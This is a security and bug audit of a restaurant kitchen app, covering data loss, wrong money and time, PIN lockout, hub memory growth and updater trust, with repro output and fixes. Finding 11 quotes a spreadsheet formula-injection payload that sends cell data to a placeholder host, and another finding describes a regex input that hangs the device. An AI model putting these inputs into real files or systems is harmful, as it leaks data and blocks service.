# Independent review (night/review-r1)

Reviewer had not seen this code before. Source tree: `kds/main` at 524477d. Nothing in the app was changed. Every "confirmed" item was reproduced with a small Node script in the `test/_load.mjs` style (scripts were throwaway, in `/tmp/review/`, not committed; the key lines are quoted below). "Suspected" means read from the code but not reproduced.

Totals: 16 confirmed findings (data loss 6, wrong money 3, wrong time 2, security 4, availability 1), 8 suspected, plus a "checked and fine" list at the end.

## Ranked findings

### 1. DATA LOSS: a damaged save is overwritten even when the "set aside" copy could not be written
`src/js/30-store.js:534` (park), `:569` (`if (st.corrupt) schedulePersist(false)`), `src/js/99-boot.js:75` (toast).

`init()` parks an unreadable/refused save with `try { storage.set(CORRUPT_KEY, payload) } catch {}`, then starts with a blank kitchen and replaces the live key. The parked copy is the same size as the live save, so when the browser store is nearly full (the exact case where you have a big busy kitchen) the park fails with QuotaExceeded, the error is swallowed, and the only copy is overwritten. The toast still says "A copy of the old data was kept on this device."

Repro (quota-limited fake store, 60 dishes + 4500 tickets = 4.89 MB, then the saved envelope marked `state.v = 2`, which `validateBackup` refuses):
```
init status corrupt: unsupported version 2
menu now 0  parked corrupt copy present: false  KEY chars 1480
original kitchen recoverable anywhere in storage? state:1480, sid:14, lastgood:1500
```
No rolling last-good copy exists either, because `maybeSnapshot` quietly skips when the store is that full.
Fix (smallest): check the return of `storage.set(CORRUPT_KEY, ...)`. If it is false or throws, do not call `schedulePersist`; run in memory only, set a status flag, and show a blocking "your saved data could not be read and could not be kept safe, download it now" screen offering the raw text.

### 2. DATA LOSS: records the validator drops at load are lost for good, and the toast says "Nothing else changed"
`src/js/20-engine.js:4056` (`repairTicket` returns null), `:4092` (`repairOrder` returns null), batch/ingredient drop rules around `:3846-3900`; toast at `src/js/99-boot.js:76`.

When the saved state is "valid but needs repair", `init()` loads the repaired state (dropped tickets, orders, batches) and does not park the original. The next save overwrites it. The only message is "Smokebox updated a few saved settings while opening. Nothing else changed." That is false when sales were dropped.

Repro (saved copy with one paid order whose `tip` is the string "2.00" and one ticket missing `dmaxSec`):
```
status.corrupt = null | repaired = ["dropped ticket t_5","dropped order o_3"]
orders before 5, after 4 | paid total now 40 (was 50)
saved copy now has orders: 4  parked copy: false
```
Any future bug or older-build difference that produces a record the validator dislikes silently deletes sales and safety records at the next reload.
Fix: when `repaired` contains any "dropped" entry, write the pre-repair payload to `CORRUPT_KEY` (same park logic as item 1) and say plainly how many orders/tickets/batches were dropped.

### 3. DATA LOSS: hub replaces an unreadable or refused `state.json` on the first action, with no backup
`server/server.mjs:29-37` (`loadSaved` returns null), `:55` (fresh state), `:40-44` (`writeSaved`).

If `state.json` is truncated (rename without fsync after a power cut), or the running build refuses it (for example `v: 2` after an updater rollback), the hub logs one line, starts a fresh sample kitchen, and overwrites the file at the first action. No `.bak`, no `.corrupt` copy.
```
[hub] saved file unreadable: Unterminated string in JSON ...   menu after bad file load 21
file after first action (damaged copy overwritten?): 12145 [ 'state.json' ]
[hub] saved file refused: unsupported version 2
v2 file after first action -> 22 dishes; dir [ 'state.json' ]
```
This also defeats the updater's promise "Saved data is never touched": the health check is `GET /`, which answers 200 even though the new build discarded the data.
Fix: on a refused/unreadable file, rename it to `state.json.corrupt-<time>` before doing anything else; keep a rolling `state.json.bak` (write tmp, fsync, rename, copy previous to .bak); optionally refuse to start so the updater rolls back.

### 4. SECURITY / LOCKOUT: anyone at the board can replace the manager PIN, and the owner's recovery code is replaced and shown to them
`src/js/77-floor-setup.js:1405` (Set PIN button in "Tax, hours and PIN", reachable from the floor Menu with no PIN), `src/js/60-shell.js:1301-1309` (`S.setPin` has no old-PIN check), `src/js/77-floor-setup.js:1406` (`showRecoveryCode()` then calls `createRecoveryCode`, which replaces `recoveryHash`).

The office "Change PIN" form checks the current PIN (`84-office-data.js:1134`); the floor sheet does not. A cook can set PIN 0000, which locks the owner out of the back office (where backup and restore live), and the recovery code the owner wrote down stops working.
```
cook overwrites PIN with 0000: ok
new recovery code issued to the cook: true  owner old code still works? wrongRecoveryCode
```
(The engine-level calls are what the sheet makes; I did not click it in a browser.)
Fix: in `openShop` and `S.setPin`, when `hasPin()` require the current PIN (reuse `S.checkPin`) before setting, changing or clearing; same for `createRecoveryCode` when a recovery hash already exists.

### 5. WRONG TIME + SAFETY DATA: one forward clock blip moves the app clock forward permanently and auto-discards every batch
`src/js/30-store.js:97-109` (`now()` never goes back), `:120` (`atLeast`), `:555` (`vNow = max(r, c.virtual + elapsed)`), also `importAll` calls `atLeast(lastStamp(ns))` at `:713`.

A single tick where the device clock reads 10 years ahead (dead RTC battery, bad NTP, wrong date on a replacement tablet) is accepted, and the virtual offset is saved and re-applied on every reload.
```
app now vs real (days ahead): 3650
batch statuses after blip: discard x11   (all batches; permanent batch_discard events)
after reload, app now ahead by days: 3650  date 2036-10-17
```
Every later ticket, sale, service day, close-day and safety timer is in 2036. Restoring a backup whose newest stamp is ahead of the device clock does the same.
Fix: in a real kitchen (`strict && mode==='real'`) never adopt a saved `virtual` clock, and cap `now()` at `realNow()` + a small slack (a few minutes); if loaded data has stamps more than a day ahead of the real clock, show "this device's clock looks wrong" instead of moving time.

### 6. SAFETY RECORDS: the "Thrown-out log" (screen, print, CSV) silently covers only the last ~150-200 batches
`src/js/76-floor-discards.js:46` (rows built only from `state.batches`), `src/js/20-engine.js:1816` (`pruneBatchesInto` drops finished batches older than 24 h once there are more than 200).

The `batch_discard` events survive (190-day bucket), but the log the owner prints or exports for the health department is built from batches. Sheet text says "Every batch thrown out".
```
made: 300  batchesInState: 157  batch_discard_events: 310
oldest discard visible in the thrown-out log is 2.2 days old
```
At 30 batches a day that is about a week of the log.
Fix: build rows from `E.safetyLog(state)` (`batch_discard` events carry `batchId, ing, g, reason, who, note`), falling back to batches only for the extra fields.

### 7. AVAILABILITY: one stalled event-stream client makes the hub's memory grow without limit
`server/server.mjs:85-91` (`send`/`changed` write the whole state to every client with no back-pressure check), `:57` (client set).

A tablet that sleeps with a half-open socket never drains; Node buffers every state broadcast (here 366 KB each).
```
stalled SSE client + 4000 actions: rssGrowthMB 874     (control, no stalled client: 74)
```
Fix: in `send`, if `res.writableLength > 1 MB` (or `res.write` returns false for more than a few seconds) destroy that client and delete it from `clients`; consider sending a small delta instead of the whole state.

### 8. WRONG MONEY: `validateBackup` has no upper bound on prices; a huge price makes totals Infinity/NaN and the paid order vanishes on reload
`src/js/20-engine.js:3833` (menu price only checked `>= 0`), `:4079` (ticket item price only `isNum`).

Menu edits are limited to 0-1000 (`MENU_PATCH.price`), but a backup/hub state with `price: 1e308` passes.
```
open totals { subtotal: Infinity, tax: NaN, total: NaN }
pay ok { total: NaN }  -> paid totals json {"subtotal":null,"tax":null,"total":null}
roundtrip true ... [ 'dropped order o_1' ]
```
Fix: in `validateBackup` apply the same range as `MENU_PATCH` (0-1000) to menu prices and ticket item prices (reset to base/0 and list it in `repaired`), and cap `qty`. Also have `payInto` refuse non-finite totals.

### 9. WRONG MONEY: the order screen's tax preview can differ by a cent from what the engine charges
`src/js/71-floor-order.js:165` uses `Math.round(sub * rate) / 100` in floating point; the engine uses integer cents with half-up (`20-engine.js` `totalsFrom`).
Brute force over 19 common rates and subtotals up to $3000 found 3578 mismatches; the first: 6.25 percent on $2.32: screen tax 0.14, engine tax 0.15 (2.32 * 6.25 = 14.499999999999998). The customer is shown one total and the record has another.
Fix: call `SB.engine.orderTotals(state, order, {draftSubtotal})` or copy `toCents` + the integer formula into `pendingTotal`.

### 10. WRONG MONEY: re-paying a reopened order from a closed day moves the sale to the new day, so one sale appears in two `day_closed` events
`src/js/20-engine.js:1521` (`reopenOrder` has no check against `lastClose`), `:1483` (`paidAt = stampAfter(o.createdAt, tx.now)`).
```
day1 close {"orders":1,"total":10}; reopen next day, repay by card;
order serviceDate 2026-10-20, paidAt day 2026-10-21; day2 close {"orders":1,"total":10}
day_closed events: 2026-10-20 total 10, 2026-10-21 total 10   (one $10 sale)
```
Sales-by-day CSV and the sheets use `paidAt`, so they show day 2 only, while the day-1 event still says $10.
Fix: refuse `reopenOrder` when `serviceDate(paidAt) <= lastClose.day` (or pay it back on its original day), or require a "late correction" reason and log it.

### 11. SECURITY: spreadsheet formula injection in the thrown-out log CSV
`src/js/76-floor-discards.js:70` (`q = v => '"' + ... + '"'`) has no `= + - @` guard, unlike `30-store.js:731` and `13-menu-import.js:cell`. Staff-typed Notes and Initials (`rec.extra`, `rec.initials`), column labels and food labels go into the file that is handed to an inspector or accountant. A note of `=HYPERLINK("http://x/?"&A2,"ok")` is evaluated by Excel. Fix: reuse the guarded `cell()` from the store.

### 12. SECURITY (DoS): the menu importer's line reader is quadratic; one 1 MB paste freezes the tablet for about an hour
`src/js/13-menu-import.js:168`: `/^(.*\S)\s+((?:usd\s*)?[$€£]?\s*\d[\d.,]*)$/i` on a name followed by a long run of spaces.
`'Burger' + spaces + 'x'`: n=10k 0.37 s, 20k 1.8 s, 40k 7.2 s (x4 per doubling), so the allowed 1 MB is about 1 h. No data is lost; reload fixes it. Fix: collapse whitespace (`line.replace(/\s+/g, ' ')`) before the regexes, or find the last token with `lastIndexOf(' ')`.

### 13. SECURITY: PIN and recovery code are weak against anyone who holds a backup or hub snapshot
`src/js/60-shell.js:1287` PIN is `sha256('smokebox.v1:' + 4 digits)`, unsalted: 10,000 candidates, cracked in under 1 ms (`PIN hash cracked offline -> 0000 in 0 ms`). `src/js/30-store.js:996` recovery code is `sha256('smokebox-recovery-v1:' + code)`, unsalted, 50 bits (GPU-feasible in days). Both hashes are in every backup file, in `state.json`, and in every hub `snapshot` event. The code comment already calls the PIN "not real security"; the point is that the backup file and the hub stream hand out the offline-crackable hash. The wrong-code lock holds under parallel calls (200 concurrent guesses: 11 counted, then locked). Fix (cheap): leave the PIN as a casual lock but strip `pinHash`/`recoveryHash` from `exportAll`/hub snapshots, or use PBKDF2 (WebCrypto, 100k+ iterations, random salt stored beside the hash).

### 14. WRONG TIME (operations): the nightly update runs at 04:30 UTC, not 04:30 local, and the in-memory duplicate-action memory is lost on restart
`go.sh:34` `OnCalendar=*-*-* 04:30:00` uses the server's system zone (UTC on a fresh Ubuntu image). `TZNAME` only reaches the node process (`server/setup-server.sh:55`). For the default America/New_York that is 00:30 EDT or 23:30 EST, during dinner/bar service. The restart drops `replies` (`server.mjs:61`, not saved), so an action resent after the restart is applied twice (suspected for the duplicate; the timing is certain). Fix: `OnCalendar=*-*-* 04:30:00 ${TZNAME}` (systemd supports a zone suffix), and persist recent opIds in `state.json`.

### 15. SECURITY (hardening): update and install trust one unsigned branch tarball as root
- `server/smokebox-update.sh:28` downloads `deploy.tar.gz` over HTTPS; there is no checksum, tag pin or signature. The new `smokebox-update.sh` is copied to `/usr/local/bin` (line 70) and runs as root next night, so control of the `deploy` branch is root on every server.
- `server/smokebox-update.sh:36` only rejects types `l` and `h`; as root, tar extracts FIFOs and character/block device nodes:
  `prw-r--r-- fifo` and `crw-r--r-- nullnode` were extracted into the tree (setuid bit was correctly stripped). Fix: reject anything whose listing starts with other than `-` or `d`.
- `tunnel.sh:15-18` installs `cloudflared` "latest" with `dpkg -i`, only checking size and `dpkg-deb --info`.
- No `Content-Security-Policy` anywhere (hub or Caddy) for a page full of inline script; no Host check in the hub (fine while it listens on 127.0.0.1 behind Caddy).

### 16. DATA LOSS (by design, worth a decision): "Start over" is not behind the manager PIN, and erases before the backup download is confirmed
`src/js/72-floor-sheets.js:2195` (link in the floor Menu), `src/js/77-floor-setup.js:1032-1045`, `src/js/30-store.js:1057` (`startOver`). The PIN guard only wraps office navigation (`60-shell.js:1414`). A cook who types ERASE wipes the menu, history and safety records, and (unchecked "keep PIN") the PIN too. The backup text exists only in memory and is downloaded after the erase; a blocked or failed download (iOS standalone) is reported only after the data is gone, and "Go to the first screen" reloads the page. The step-2 text says "If the backup cannot be made, nothing is erased", which is true for building the text, not for saving it. It also drops `lastgood` and the parked copy by design. Fix: require the PIN when one is set, and ask the person to confirm "I have the file" (or write the pre-erase state under a `preerase` key for 7 days).

## Suspected (read, not reproduced)
- `src/js/20-engine.js:2023` (`logTemp` cold branch): an in-range cold reading deletes `outSince`, so a batch that sat above 41 F for hours is "fine" again after one good reading, and the out-of-range time restarts from zero each time. The code comment says this is intended; check with a food-safety advisor whether time above 41 F should accumulate.
- Two tabs/devices on one browser: `rebaseIfStale` reads the save id, then `storage.set(KEY)` runs `JSON.stringify` of the whole state; a second tab saving inside that window is overwritten (no lock). Window is the stringify time (tens of ms on a multi-MB state). `30-store.js:~225-250`.
- `SAFETY_KEEP_MS` is 190 days (`20-engine.js:216`); safety events older than that are dropped when the bucket is rebuilt. Several jurisdictions want 1-2 years of temperature logs.
- `settings_changed` events record key names only (`updateSettings`), so a change to hot-hold, cold-hold or hold-hours cannot be audited afterward. `refreshAllBatches` re-evaluates live batches when limits change.
- `importAll` (`30-store.js:679`) replaces everything with no automatic copy of what was there; the old state survives only as `lastgood` until the next 6-hour snapshot.
- Names are cleaned of control characters but not bidi overrides (U+202E) or zero-width characters (`13-menu-import.js` `clean`, `20-engine.js` `cleanText`), so a dish or customer name can display reversed or spoofed.
- Caddy `basic_auth` has no rate limit; each wrong password costs a bcrypt check, so an anonymous caller can burn CPU on the small server. The `tunnel.sh` address is public.
- A hostile backup with non-string items inside `mods` or odd `name` types passes `validateBackup`; a crash in a screen that assumes strings would repeat on every load. I fuzzed the engine and views (25,000 type-mutated backups, none crashed) but did not run the DOM screens against them.

## Checked and fine (no need to re-check)
- **Hub HTTP surface** (`server/server.mjs`): static serving is two fixed routes (no path traversal), no user text reaches headers, body capped at 256 KB with early 413 and request timeouts, JSON-only content type plus same-origin check on POST (CSRF), engine exceptions return 500 without changing state, `at` times clamped between the last action and the hub clock, SSE client cap of 100.
- **DOM injection**: no `innerHTML`/`outerHTML`/`eval` with user text anywhere (`innerHTML` only in `05-icons.js` for built-in icon names, escaped); `U.h` builds text nodes; the print iframes escape every value (`76-floor-discards.js` `esc`) or write fixed text; the CSS highlight uses `CSS.escape`.
- **Prototype pollution**: `safeKey` rejects `__proto__`/inherited names for ids; `hasOwn` is used throughout; dish names `__proto__`, `constructor`, `toString` import and export cleanly and `Object.prototype` stays empty; `applyCustom` only matches known ids.
- **Importer parsing** otherwise: 1 MB and 2000-row caps, no throw on any input tried, price edge cases (`1e3`, `0x10`, full-width digits, ranges) rejected, `unguard` and the export guard round-trip `= + - @` names.
- **Other CSVs**: store CSV guard covers `= + - @ tab CR`; sales-by-day and the pilot CSV carry only numbers/dates/fixed text.
- **Money core**: integer-cent tax (half-up, 1e-7 nudge), discount clamped to food, tip/discount bounds, atomic createTicket+pay, counter-service auto-bump (stock used, nothing learned), `closeDay` totals and close-day sheet agree, no event is used for revenue so reopen does not double count inside a day, `fmtMoney`/`parseDollars` reject NaN/Infinity.
- **Validation robustness**: 24,728 mutated-but-accepted backups (null/NaN-ish/huge/array/object values at random paths) ran through tick, all views, orders, allDay, safetyLog, createTicket, closeDay, invariants and a re-validate with zero failures.
- **Demo/real isolation**: only `00-util.js` touches `localStorage`; kitchen keys map to `smokebox.demo.*`, the demo uses its own channel and never the hub transport, backups carry the mode and wrong-mode restores are refused, `leaveDemo` removes only demo keys.
- **Safety records**: `correctSafety` appends and never edits; undo marks events reverted and only lasts 10 s; quota trimming moves overflow safety events to `safetyKeep` (never trimmed by size); cold fridge out-time accumulates correctly across stays and discards at the limit.
- **Recovery lock**: 5 wrong codes lock for 15 min, survives reload; parallel guesses overshoot to about 11, not unlimited.
- **Updater mechanics**: lock via flock, path/`..`/absolute-path rejection (and GNU tar's own), symlink/hardlink rejection, setuid stripped, size/gzip/parse/health checks, rollback restores the old directory, atomic self-update. `set -e` traps are fine (`rollback` exits 1; trap cleans `$WORK`/`$NEW`). One small gap: a failure between the two `mv` lines leaves no `$PREFIX` (disk full only).
- **Installers**: unit hardening (NoNewPrivileges, ProtectSystem=strict, empty capability set, UMask 0077), node bound to 127.0.0.1, ufw rules, beta scripts validate the host name and take a copy of the Caddyfile before editing.

## Not covered
Real browser behaviour (no Playwright run: PIN sheet, startOver download, iOS PWA), `45-sim.js`, charts/metrics beyond the money sums, the hub client and the `connected` branch (beta.sh targets it; this tree's server has no follow/write codes), `tools/`, `ux-scripts/`, DOM screens fed hostile data, Caddy/systemd behaviour on a real host, and performance.
